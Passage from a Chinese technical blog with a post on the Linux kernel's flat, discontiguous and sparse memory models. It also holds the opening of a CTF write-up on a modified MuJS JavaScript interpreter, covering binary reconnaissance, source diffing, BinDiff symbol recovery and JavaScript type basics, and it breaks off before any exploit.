        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-02 21:51:26 / Modified: 21:54:14" itemprop="dateCreated datePublished" datetime="2022-10-02T21:51:26+08:00">2022-10-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>memory model</strong></p>
<p>在 Linux 内核中支持3种内存模型，分别为：</p>
<ul>
<li>flat memory model（平坦内存模型）</li>
<li>discontiguous memory model（不连续内存模型）</li>
<li>sparse memory model（稀疏内存模型）</li>
</ul>
<p>所谓 memory model（内存模型），其实就是从 CPU 的角度看其物理内存的分布情况，代表了在 Linux Kernel 中，使用什么的方式来管理这些物理内存（某些体系架构支持多种内存模型，但在内核编译构建时只能选择使用一种内存模型）</p>
<ul>
<li>程序分段和 CPU 内存分段是不同的概念 </li>
</ul>
<img src="/2022/10/02/Linux%20%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%AE%80%E6%9E%90/1664695526151.png" class width="1664695526151"> 
<p>在 <code>include/asm-generic/memory_model.h</code> 中，Linux 为每个 memory model 准备了如下的宏定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> page_to_pfn __page_to_pfn <span class="comment">/* 虚拟内存-&gt;物理内存 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pfn_to_page __pfn_to_page <span class="comment">/* 物理内存-&gt;虚拟内存 */</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>用于把虚拟内存中的 <code>struct page</code> 和切分后的物理内存 <code>page frame</code> 关联起来</li>
</ul>
<p><strong>Flat memory model（平坦内存模型）</strong></p>
<p>平坦内存模型是相对于多段模型而言的</p>
<ul>
<li>8086实模式CPU的16位寄存器最多只能在一个内存段的64kb空间内寻址，要是超过64kb，它只能先变换段基址，来达到长距离取指的目的</li>
<li>平坦模型至始至终只有一个段，它能直接访问内存空间，不用再进行段基址的变换</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __pfn_to_page(pfn)	(mem_map + ((pfn) - ARCH_PFN_OFFSET))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __page_to_pfn(page)	((unsigned long)((page) - mem_map) + \</span></span><br><span class="line"><span class="meta">				 ARCH_PFN_OFFSET)</span></span><br></pre></td></tr></table></figure>
<p>图示：</p>
<img src="/2022/10/02/Linux%20%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%AE%80%E6%9E%90/1664699048502.png" class width="1664699048502"> 
<ul>
<li>对于 flat memory model 来说，物理内存本身是连续的</li>
<li>如果不连续的话，那么中间一部分物理地址是没有对应的物理内存，就会形成一个个洞，这就浪费了 mem_map 数组本身占用的内存空间</li>
</ul>
<p>其特点如下：</p>
<ul>
<li>内存连续且不存在空隙</li>
<li>通常应用于 UMA 系统（一致内存访问）</li>
<li>通过 CONFIG_FLATMEM 进行配置</li>
</ul>
<p><strong>Discontiguous memory model（不连续内存模型）</strong></p>
<p>如果CPU在访问物理内存的时候，其地址空间是有一些空洞的，是不连续的，那么这种计算机系统的内存模型就是 discontiguous memory model </p>
<ul>
<li>discontiguous memory model 是为了 NUMA 系统设计的（非一致内存访问）</li>
<li>NUMA 系统中每个 CPU 都有自己的本地内存，CPU 访问本地内存不用过总线，因而速度要快很多，每个 CPU 和内存在一起，称为一个 NUMA 节点</li>
<li>NUMA 中的每个节点 Node 用一个 pglist_data 的结构体表示 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __pfn_to_page(pfn)			\</span></span><br><span class="line"><span class="meta">(&#123;	unsigned long __pfn = (pfn);		\</span></span><br><span class="line"><span class="meta">	unsigned long __nid = arch_pfn_to_nid(__pfn);  \</span></span><br><span class="line"><span class="meta">	NODE_DATA(__nid)-&gt;node_mem_map + arch_local_page_offset(__pfn, __nid);\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __page_to_pfn(pg)						\</span></span><br><span class="line"><span class="meta">(&#123;	const struct page *__pg = (pg);					\</span></span><br><span class="line"><span class="meta">	struct pglist_data *__pgdat = NODE_DATA(page_to_nid(__pg));	\</span></span><br><span class="line"><span class="meta">	(unsigned long)(__pg - __pgdat-&gt;node_mem_map) +			\</span></span><br><span class="line"><span class="meta">	 __pgdat-&gt;node_start_pfn;					\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure>
<p>图示：</p>
<img src="/2022/10/02/Linux%20%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%AE%80%E6%9E%90/1664699135513.png" class width="1664699135513"> 
<ul>
<li>由于每个 CPU 都有自己的本地内存，导致了物理内存必然有一些空洞</li>
</ul>
<p>其特点如下：</p>
<ul>
<li>多个内存节点不连续并且存在空隙</li>
<li>适用于 UMA 系统和 NUMA 系统</li>
<li>通过 CONFIG_CONTIGMEM 配置</li>
</ul>
<p>随着 sparse memory model 的提出，这种内存模型也逐渐被弃用了（ARM在2010年已经移除了对 discontiguous memory model 的支持）</p>
<p><strong>Sparse memory model（稀疏内存模型）</strong></p>
<p>sparse memory model 是为了解决 discontiguous memory model 存在的弊端，而被提出的</p>
<ul>
<li>连续的地址空间按照 section 被分成一段一段的，其中每一个 section 都是 Hotplug 的，因此内存地址空间可以被切分的更细，支持更离散的不连续内存</li>
<li>被管理的物理内存由一个个任意大小的 mem_section 构成，因此整个物理内存可被视为一个 mem_section 数组，每个 mem_section 包含了一个间接指向 page 数组的指针</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __page_to_pfn(pg)					\</span></span><br><span class="line"><span class="meta">(&#123;	const struct page *__pg = (pg);				\</span></span><br><span class="line"><span class="meta">	int __sec = page_to_section(__pg);			\</span></span><br><span class="line"><span class="meta">	(unsigned long)(__pg - __section_mem_map_addr(__nr_to_section(__sec)));	\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __pfn_to_page(pfn)				\</span></span><br><span class="line"><span class="meta">(&#123;	unsigned long __pfn = (pfn);			\</span></span><br><span class="line"><span class="meta">	struct mem_section *__sec = __pfn_to_section(__pfn);	\</span></span><br><span class="line"><span class="meta">	__section_mem_map_addr(__sec) + __pfn;		\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure>
<p>图示：</p>
<img src="/2022/10/02/Linux%20%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%AE%80%E6%9E%90/1664699863779.png" class width="1664699863779"> 
<p>其特点如下：</p>
<ul>
<li>多个内存区域不连续并且存在空隙</li>
<li>以 section 为单位管理 online 和 hot-plug 内存</li>
<li>支持内存热插拔(hot plug memory)，但性能稍逊色于 DISCONTIGMEM</li>
<li>在x86或ARM64内存采用该中模型，其性能比 DISCONTIGMEM 更优并且与 FLATMEM 相当</li>
<li>对于ARM64平台默认选择该内存模型</li>
<li>通过 CONFIG_SPARSEMEM 配置</li>
</ul>
<p><strong>平台内存模型支持</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>系统架构</th>
<th>FLATMEM</th>
<th>DISCONTIGMEM</th>
<th>SPARSEMEM</th>
</tr>
</thead>
<tbody>
<tr>
<td>ARM</td>
<td>默认</td>
<td>不支持</td>
<td>某些系统可选配置</td>
</tr>
<tr>
<td>ARM64</td>
<td>不支持</td>
<td>不支持</td>
<td>默认</td>
</tr>
<tr>
<td>x86_32</td>
<td>默认</td>
<td>不支持</td>
<td>可配置</td>
</tr>
<tr>
<td>x86_32(NUMA)</td>
<td>不支持</td>
<td>默认</td>
<td>可配置</td>
</tr>
<tr>
<td>x86_64</td>
<td>不支持</td>
<td>不支持</td>
<td>默认</td>
</tr>
<tr>
<td>x86_64(NUMA)</td>
<td>不支持</td>
<td>不支持</td>
<td>默认</td>
</tr>
</tbody>
</table>
</div>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u012489236/article/details/106323088#:~:text=Linux提供了三种内存模型（ include%2Fasm-generic%2Fmemory_model.h ），一般处理器架构支持一种或者多种内存模型，这个在编译阶段就已经确定，比如目前在ARM64中，使用的 Sparse Memory Model,。 2.1 FLAT memory model (平坦内存模型">linux内存模型</a>) </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/01/JavaScript%20pwn+%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/01/JavaScript%20pwn+%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/" class="post-title-link" itemprop="url">JavaScript pwn+类型混淆</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-01 20:34:33 / Modified: 20:37:06" itemprop="dateCreated datePublished" datetime="2022-10-01T20:34:33+08:00">2022-10-01</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>mujs 复现</strong></p>
<p>没有遇见过的 pwn</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.3</span>)</span> stable release version 2.31</span></span><br></pre></td></tr></table></figure>
<p>根据题目信息，先学习 mujs 是什么东西</p>
<p><strong>MuJs 简述</strong></p>
<p>MuJS 是一个轻量级的 JavaScript 解释器，用于嵌入到其他的软件中提供脚本执行功能，使用可移植 C 编写，实现了 ECMA-262 规定的 ECMAScript 标准</p>
<p>MuJS 包含一个简单的可执行程序 mujs，它通过调用 MuJS 库提供一套标准的 javascript 解释器，作为 javasript 的交互终端或者批处理命令执行平台</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  release ./mujs</span><br><span class="line">Welcome to MuJS <span class="number">1.2</span><span class="number">.0</span>.</span><br><span class="line">&gt; </span><br></pre></td></tr></table></figure>
<ul>
<li>启动解释器 mujs 后，可以输入 JavaScript 代码</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mujs: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>_amd64/ld<span class="number">-2.31</span>.so, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">27979</span>cb2ff1c7a6765b5243c3aaad6c609e88108, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p>先通过题目给的哈希下载 MuJS 源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd0a0972b4428771e6a3887da2210c7c9dd40f9c </span><br></pre></td></tr></table></figure>
<ul>
<li>链接：<a target="_blank" rel="noopener" href="https://github.com/ccxvii/mujs">An embeddable Javascript interpreter in C</a></li>
<li>使用 <code>make debug</code> 生成有符号的文件，可以开始调试</li>
</ul>
<p>使用 diff 命令对比源码和题目文件的差异，找出需要分析的目标：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 diff mujs susctf2022_mujs </span><br><span class="line">只在 susctf2022_mujs 存在：build # ignore</span><br><span class="line">mujs/docs 和 susctf2022_mujs/docs 有共同的子目录</span><br><span class="line">只在 mujs 存在：.gitattributes # ignore</span><br><span class="line">只在 mujs 存在：.gitignore # ignore</span><br><span class="line">diff --color mujs/jsbuiltin.c susctf2022_mujs/jsbuiltin.c</span><br><span class="line">diff --color mujs/jsbuiltin.h susctf2022_mujs/jsbuiltin.h</span><br><span class="line">diff --color mujs/jscompile.c susctf2022_mujs/jscompile.c</span><br><span class="line">只在 susctf2022_mujs 存在：jsdataview.c # target</span><br><span class="line">diff --color mujs/jsdump.c susctf2022_mujs/jsdump.c</span><br><span class="line">diff --color mujs/jsgc.c susctf2022_mujs/jsgc.c</span><br><span class="line">diff --color mujs/jsi.h susctf2022_mujs/jsi.h</span><br><span class="line">diff --color mujs/jsobject.c susctf2022_mujs/jsobject.c</span><br><span class="line">diff --color mujs/json.c susctf2022_mujs/json.c</span><br><span class="line">diff --color mujs/jsstate.c susctf2022_mujs/jsstate.c</span><br><span class="line">diff --color mujs/jsvalue.h susctf2022_mujs/jsvalue.h</span><br><span class="line">diff --color mujs/main.c susctf2022_mujs/main.c</span><br><span class="line">diff --color mujs/mujs.h susctf2022_mujs/mujs.h</span><br><span class="line">diff --color mujs/one.c susctf2022_mujs/one.c</span><br><span class="line">diff --color mujs/pp.c susctf2022_mujs/pp.c</span><br><span class="line">diff --color mujs/regexp.c susctf2022_mujs/regexp.c</span><br><span class="line">mujs/tools 和 susctf2022_mujs/tools 有共同的子目录</span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现以上这些模块或多或少都有差异，不知道是版本问题还是魔改了源码</li>
<li>只在 susctf2022_mujs 存在：jsdataview.c，先重点分析这个文件</li>
</ul>
<p><strong>Bindiff 恢复符号</strong></p>
<p>由于题目给出了源码，可以用 Bindiff 的 IDA 插件来获取源文件的符号</p>
<p>先利用题目给出的代码编译一个有符号的文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make debug</span><br></pre></td></tr></table></figure>
<p><img src="/2022/10/01/JavaScript%20pwn+%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/1663899331395.png" alt="1663899331395"> </p>
<p>在 IDA 中使用 Bindiff 插件：</p>
<p><img src="/2022/10/01/JavaScript%20pwn+%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/1663899574810.png" alt="1663899574810"> </p>
<ul>
<li>注意：Bindiff 不支持中文路径</li>
</ul>
<p>选中需要恢复的符号，然后选择导入（一般选择相似度在 0.8 以上的函数，但这个题目推荐用字符串来定位函数位置）</p>
<p><img src="/2022/10/01/JavaScript%20pwn+%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/1663899924065.png" alt="1663899924065"> </p>
<p><strong>JavaScript 数据类型</strong></p>
<p>值类型(基本类型)：字符串(String)，数字(Number)，布尔(Boolean)，空(Null)，未定义(Undefined)，Symbol</p>
<p>引用数据类型(对象类型)：对象(Object)，数组(Array)，函数(Function)，正则(RegExp)，日期(Date)</p>
<ul>
<li>将变量的值设置为空 Null 来清空变量</li>
<li>未定义 Undefined 表示变量不含有值</li>
<li>对象也是一个变量，但对象可以包含多个值（多个变量），每个值以 name:value 对呈现</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;<span class="attr">firstName</span>:<span class="string">&quot;John&quot;</span>, <span class="attr">lastName</span>:<span class="string">&quot;Doe&quot;</span>, <span class="attr">age</span>:<span class="number">50</span>, <span class="attr">eyeColor</span>:<span class="string">&quot;blue&quot;</span>&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>所有的 JavaScript 变量都是对象，数组元素是对象，函数是对象</li>
<li>因此，你可以在数组中有不同的变量类型，你可以在一个数组中包含对象元素、函数、甚至是其它数组：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myCars=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">&quot;Saab&quot;</span>,<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> myArray=<span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">myArray[<span class="number">0</span>]=<span class="built_in">Date</span>.now; <span class="comment">// 对象元素</span></span><br><span class="line">myArray[<span class="number">1</span>]=myFunction; <span class="comment">// 函数</span></span><br><span class="line">myArray[<span class="number">2</span>]=myCars; <span class="comment">// 数组</span></span><br></pre></td></tr></table></figure>
<p><strong>JavaScript 类型系统</strong></p>
<p>我们经常用两个维度去描述一个编程语言的特性：</p>
<ul>
<li>强类型与弱类型，这是从 <strong>类型安全</strong> 的维度分类</li>
<li>静态类型与动态类型，这是从 <strong>类型检查</strong> 的维度分类</li>
</ul>
<p><strong>强类型</strong> ：要求语言层面限制函数的实参类型必须与形参类型相同</p>
<p><strong>弱类型</strong> : 语言层面不会限制实参的类型</p>
<p>下面是一个例子，用于对比强类型的 Java 和弱类型的 JavaScript：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java(强类型)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 这里定义了传入的参数是int类型，那么实际的时候也应该是int类型</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        System.out.printIn(num);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(Sting[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 下面的如果int类型就通过，如果不是int类型就会报错</span></span><br><span class="line">        Main.foo(<span class="number">100</span>); <span class="comment">// ok</span></span><br><span class="line">        Main.foo(<span class="string">&#x27;100&#x27;</span>); <span class="comment">// error &quot;100&quot; is a string</span></span><br><span class="line">        Main.foo(Integer.parseInt(<span class="string">&quot;100&quot;</span>)); <span class="comment">// ok</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JavaScript(弱类型)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 传的时候没有规定是什么类型，那么实参是什么类型都不会报错</span></span><br><span class="line">    <span class="built_in">console</span>.log(num)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(<span class="number">100</span>) <span class="comment">// ok</span></span><br><span class="line">foo(<span class="string">&#x27;100&#x27;</span>) <span class="comment">// ok</span></span><br><span class="line">foo(<span class="built_in">parseInt</span>(<span class="string">&#x27;100&#x27;</span>)) <span class="comment">// ok</span></span><br></pre></td></tr></table></figure>
<ul>
<li>强类型语言中不允许有任何的隐式类型转换，而弱类型语言则允许任意的数据隐式类型转换</li>
</ul>
<p><strong>静态类型</strong>：一个变量声明时它的类型就是明确的，声明过后，类型不能修改</p>
<p><strong>动态类型</strong>：运行阶段才可以明确变量的类型，而且变量的类型随时可以改变。所以动态类型语言中的变量没有类型，变量中存放的值时有类型的</p>
<p>下面举个例子： </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java(静态类型)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 一开始就定了num的类型是int,不能修改成string</span></span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">100</span>;</span><br><span class="line">        num = <span class="number">50</span>; <span class="comment">// ok</span></span><br><span class="line">        num = <span class="string">&#x27;100&#x27;</span> <span class="comment">// error</span></span><br><span class="line">        System.out.printInt(num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JavaScript(动态类型)</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">100</span></span><br><span class="line"><span class="comment">// 可以随意修改num的类型</span></span><br><span class="line">num = <span class="number">50</span> <span class="comment">// ok</span></span><br><span class="line">num = <span class="string">&#x27;100&#x27;</span> <span class="comment">// ok</span></span><br><span class="line">num = <span class="literal">true</span> <span class="comment">// ok</span></span><br><span class="line"><span class="built_in">console</span>.log(num)</span><br></pre></td></tr></table></figure>
<p>JavaScript 是一个弱类型且动态类型的语言</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/00bbe27fb6a0">JavaScript类型系统</a> </p>
<p><strong>JavaScript 构造函数</strong></p>
<p>有时我们需要创建相同“类型”的许多对象的“蓝图”（类似于C语言中的结构体）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">first, last, age, eye</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.firstName = first;</span><br><span class="line">    <span class="built_in">this</span>.lastName = last;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">    <span class="built_in">this</span>.eyeColor = eye;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 JavaScript 中，被称为 <code>this</code> 的事物是代码的“拥有者”</li>
<li>在构造器函数中，<code>this</code> 是没有值的，它是新对象的替代物，当一个新对象被创建时，<code>this</code> 的值会成为这个新对象（有点像 python 中的 <code>self</code>）</li>
</ul>
<p>创建一种“对象类型”的方法，是使用对象构造器函数，在上面的例子中，函数 Person() 就是对象构造器函数</p>
<p>通过 new 关键词调用构造器函数可以创建相同类型的对象：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myFather = <span class="keyword">new</span> Person(<span class="string">&quot;Bill&quot;</span>, <span class="string">&quot;Gates&quot;</span>, <span class="number">62</span>, <span class="string">&quot;blue&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> myMother = <span class="keyword">new</span> Person(<span class="string">&quot;Steve&quot;</span>, <span class="string">&quot;Jobs&quot;</span>, <span class="number">56</span>, <span class="string">&quot;green&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>构造器函数中也可以定义方法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">firstName, lastName, age, eyeColor</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.firstName = firstName;  </span><br><span class="line">    <span class="built_in">this</span>.lastName = lastName;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">    <span class="built_in">this</span>.eyeColor = eyeColor;</span><br><span class="line">    <span class="built_in">this</span>.changeName = <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.lastName = name;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myFriend = <span class="keyword">new</span> Person(<span class="string">&quot;Bill&quot;</span>, <span class="string">&quot;Gates&quot;</span>, <span class="number">62</span>, <span class="string">&quot;blue&quot;</span>);</span><br><span class="line">myFriend.changeName(<span class="string">&quot;Jobs&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>通过用 <code>myFriend</code> 替代 <code>this</code>，JavaScript 可以获知目前处理的哪个 person</li>
</ul>
<p>构造函数中的资源浪费：</p>
